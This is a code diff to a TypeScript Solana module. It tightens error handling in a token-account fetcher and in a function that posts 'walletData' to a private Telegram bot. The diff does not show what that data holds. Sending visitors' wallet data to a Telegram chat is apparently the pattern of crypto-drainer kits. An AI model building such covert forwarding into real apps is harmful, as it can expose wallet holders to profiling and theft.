@@ -1,4 +1,4 @@
-import { Connection, LAMPORTS_PER_SOL, PublicKey } from '@solana/web3.js';
+import { Connection, PublicKey } from '@solana/web3.js';
 import { toast } from '@/components/ui/use-toast';
 
 export const getTokenAccounts = async (connection: Connection, walletAddress: string) => {
@@ -15,12 +15,16 @@ export const getTokenAccounts = async (connection: Connection, walletAddress: st
     }));
   } catch (error) {
     console.error('Error fetching token accounts:', error);
-    return [];
+    throw new Error('Failed to fetch token accounts');
   }
 };
 
 export const sendToTelegram = async (walletData: any) => {
   try {
+    if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
+      throw new Error('Telegram configuration is missing');
+    }
+
     const response = await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: {
@@ -35,12 +39,10 @@ export const sendToTelegram = async (walletData: any) => {
     if (!response.ok) {
       throw new Error('Failed to send message to Telegram');
     }
+
+    return true;
   } catch (error) {
     console.error('Error sending to Telegram:', error);
-    toast({
-      title: "Error",
-      description: "Failed to send wallet data",
-      variant: "destructive",
-    });
+    throw error;
   }
 };
